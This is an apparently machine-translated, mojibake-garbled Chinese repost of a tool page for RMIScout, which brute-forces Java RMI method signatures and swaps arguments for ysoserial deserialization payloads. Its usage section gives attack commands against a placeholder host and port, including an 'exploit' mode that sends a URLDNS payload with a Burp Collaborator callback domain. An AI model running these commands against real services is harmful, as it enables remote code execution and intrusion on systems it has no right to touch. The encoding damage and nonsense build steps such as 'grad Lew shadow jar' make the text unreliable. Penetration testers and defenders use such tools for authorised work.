# RMIScout:é’ˆå¯¹æš´éœ²çš„ Java RMI æ¥å£çš„æš´åŠ›æ”»å‡»

> åŸæ–‡ï¼š<https://kalilinuxtutorials.com/rmiscout/>

[![RMIScout : Bruteforce Attacks Against Exposed Java RMI Interfaces](img//b0e64841a2973653f5072d9d063e7636.png "RMIScout : Bruteforce Attacks Against Exposed Java RMI Interfaces")](https://1.bp.blogspot.com/-AiuDSPkEFTw/XvOrE839z1I/AAAAAAAAGtI/gUVrQ8xjr5Y1s4Yah_98tTp4BXToJNpvQCLcBGAsYHQ/s1600/RMIScout%25281%2529.png)

RMIScout å¯¹æš´éœ²çš„ Java RMI æ¥å£æ‰§è¡Œå•è¯åˆ—è¡¨å’Œæš´åŠ›æ”»å‡»ï¼Œä»¥åœ¨ä¸è°ƒç”¨çš„æƒ…å†µä¸‹å®‰å…¨åœ°çŒœæµ‹æ–¹æ³•ç­¾åã€‚

åœ¨é”™è¯¯é…ç½®çš„æœåŠ¡å™¨ä¸Šï¼Œä»»ä½•å·²çŸ¥çš„ä½¿ç”¨éåŸå§‹ç±»å‹çš„ RMI ç­¾å(ä¾‹å¦‚ï¼Œ`**java.lang.String**`)éƒ½å¯ä»¥é€šè¿‡ç”¨åºåˆ—åŒ–çš„æœ‰æ•ˆè´Ÿè½½æ›¿æ¢å¯¹è±¡æ¥åˆ©ç”¨ã€‚

è¿™æ˜¯ä¸€ç§ç›¸å½“å¸¸è§çš„é”™è¯¯é…ç½®(ä¾‹å¦‚ï¼ŒVMWare VSP here Data Protection+v realize Operations Managerã€Pivotal tc Server å’Œ Gemfireã€Apache Karaf + Cassandra)ï¼Œæ­£å¦‚åœ¨ [An Trinh çš„ 2019 Blackhat EU talk](https://i.blackhat.com/eu-19/Wednesday/eu-19-An-Far-Sides-Of-Java-Remote-Protocols.pdf) ä¸­æ‰€å¼ºè°ƒçš„ã€‚

RMIScout ä¸ [ysoserial](https://github.com/frohoff/ysoserial/) å’Œ [GadgetProbe](https://github.com/bishopfox/gadgetprobe) é›†æˆï¼Œå¯¹é”™è¯¯é…ç½®è¿›ç¨‹çº§åºåˆ—åŒ–è¿‡æ»¤å™¨çš„æœåŠ¡è¿›è¡Œååºåˆ—åŒ–æ”»å‡»( [JEP 290](https://openjdk.java.net/jeps/290) )ã€‚

![](img//45d383e000b1174e1395b23e878251ea.png)

**åŠ¨æœº**

æˆ‘éœ€è¦ä¸€ä¸ªå·¥å…·æ¥å®Œæˆä»¥ä¸‹ä»»åŠ¡:

1.  æä¾›å•è¯åˆ—è¡¨å’ŒåŸºäºæ–‡æœ¬çš„å¼ºåˆ¶ç­–ç•¥ï¼Œè€Œä¸æ˜¯å¼ºåˆ¶ 64 ä½æ–¹æ³•å“ˆå¸Œã€‚
2.  è¯†åˆ« RMI æ–¹æ³•è€Œä¸è°ƒç”¨å®ƒä»¬ã€‚
3.  æä¾›ä¸€ç§ç®€å•çš„æ–¹æ³•æ¥åˆ©ç”¨å·²çŸ¥çš„ä¸å®‰å…¨ RMI å‚æ•°è§£ç»„é—®é¢˜ï¼Œå¹¶ä¸ ysoserial æˆ–å®ç° **`ysoserial.payloads.ObjectPayload`çš„æœ‰æ•ˆè´Ÿè½½é›†æˆã€‚**
4.  é›†æˆ GadgetProbe æ¥è¯†åˆ«è¿œç¨‹ç±»ï¼Œä»¥å¸®åŠ©è¯†åˆ«ç›¸å…³è½¯ä»¶å’Œæ„é€ å°å·¥å…·é“¾ã€‚

ä¸ºäº†å¼€å§‹ä½ çš„æœç´¢ï¼ŒåŒ…å«çš„`**lists/prototypes.txt**`å•è¯è¡¨æ˜¯ä» GitHub çš„ OSS é¡¹ç›®ä¸­å‘ç°çš„ 15ï¼Œ000 ä¸ª RMI åŸå‹ä¸­åˆ é™¤é‡å¤çš„å•è¯è¡¨ã€‚éšæ—¶æäº¤ä¸€ä»½å…¬å…³ï¼ŒåŒ…æ‹¬æ›´å¤šğŸ™‚

å®ƒæ˜¯å¦‚ä½•å·¥ä½œçš„ï¼Ÿ

ä¸ºäº†è¯†åˆ«ä½†ä¸æ‰§è¡Œ RMI å‡½æ•°ï¼ŒRMIScout ä½¿ç”¨ä½çº§ RMI ç½‘ç»œå‡½æ•°å’ŒåŠ¨æ€ç±»ç”Ÿæˆæ¥å‘é€æ•…æ„ä¸åŒ¹é…ç±»å‹çš„ RMI è°ƒç”¨ï¼Œä»¥è§¦å‘è¿œç¨‹å¼‚å¸¸ã€‚æ‰€æœ‰å‚æ•°éƒ½æ›¿æ¢ä¸ºåŠ¨æ€ç”Ÿæˆçš„å¯åºåˆ—åŒ–ç±»ï¼Œè¯¥ç±»å…·æœ‰ 255 ä¸ªå­—ç¬¦çš„åç§°ï¼Œå‡å®šåœ¨è¿œç¨‹ç±»è·¯å¾„ä¸­ä¸å­˜åœ¨ã€‚ä¾‹å¦‚:

è¿œç¨‹æ¥å£:

**ä½œåºŸç™»å½•(å­—ç¬¦ä¸²ç”¨æˆ·ï¼Œå­—ç¬¦ä¸²å¯†ç )**

RMIScout å°†è°ƒç”¨:

**ç™»å½•((å­—ç¬¦ä¸²)æ–° QQkzkn3)..255 ä¸ªå­—ç¬¦..()ï¼Œ(String)æ–° Qkzkn3..255 ä¸ªå­—ç¬¦..())**

å¦‚æœè¯¥ç±»å­˜åœ¨ï¼Œè¿™å°†å¯¼è‡´ç”±`ClassNotFoundException`æˆ–å‚æ•°è§£ç»„é”™è¯¯å¼•èµ·çš„è¿œç¨‹`java.rmi.UnmarshalException`ï¼Œè€Œä¸ä¼šè°ƒç”¨åº•å±‚æ–¹æ³•ã€‚

ç‚¹å‡»é˜…è¯»[å®Œæ•´çš„æŠ€æœ¯æ–‡ç« ã€‚](https://know.bishopfox.com/research/rmiscout)

**ç”¨é€”**

```
# Perform wordlist-attack against remote RMI service using wordlist of function prototypes
./rmiscout.sh wordlist -i lists/prototypes.txt <host> <port>

# Bruteforce using method wordlist and other options
./rmiscout.sh bruteforce -i lists/methods.txt -r void,boolean,long -p String,int -l 1,4 <host> <port>

# Swap object-derived types with the specified ysoserial payload and payload parameter
./rmiscout.sh exploit -s 'void vulnSignature(java.lang.String a, int b)' -p ysoserial.payloads.URLDNS -c "http://examplesubdomain.burpcollaborator.net" -n registryName <host> <port>

# Use GadgetProbe and a known signature to bruteforce classes on the remote classpath
./rmiscout.sh probe -s 'void vulnSignature(java.lang.String a, int b)' -i ../GadgetProbe/wordlists/maven_popular.list -d "examplesubdomain.burpcollaborator.net" -n registryName <host> <port> 
```

**å»ºç­‘&è¿è¡Œ**

ä½¿ç”¨é™„å¸¦çš„`**rmiscout.sh**`è„šæœ¬è‡ªåŠ¨æ„å»ºé¡¹ç›®ï¼Œå¹¶ä½œä¸º`**java -jar**`è¯­æ³•çš„æ–¹ä¾¿åŒ…è£…:

**ã€‚/RMI scout . sh word list-I lists/prototypes . txt<ä¸»æœº> <ç«¯å£>**

æˆ–è€…ï¼Œæ‰‹åŠ¨æ„å»ºé¡¹ç›®å¹¶ä½¿ç”¨ä¼ ç»Ÿçš„`java -jar`è¯­æ³•:

**#æ‰‹åŠ¨å»ºç«‹ç½å­**
ã€‚/grad Lew shadow jar

Java-jar build/libs/RMI scout-1.01-SNAPSHOT-all . jar wordlist-I lists/prototypes . txt<host><port>

**å°è¯•ä¸€ä¸‹**

è¿è¡Œæ¼”ç¤º RMI æœåŠ¡å™¨ã€‚è¯•ç”¨æ”¶å½•çš„ **`demo/wordlist.txt`ã€‚**

**cd æ¼”ç¤º
ã€‚/start.sh**

[**Download**](https://github.com/BishopFox/rmiscout)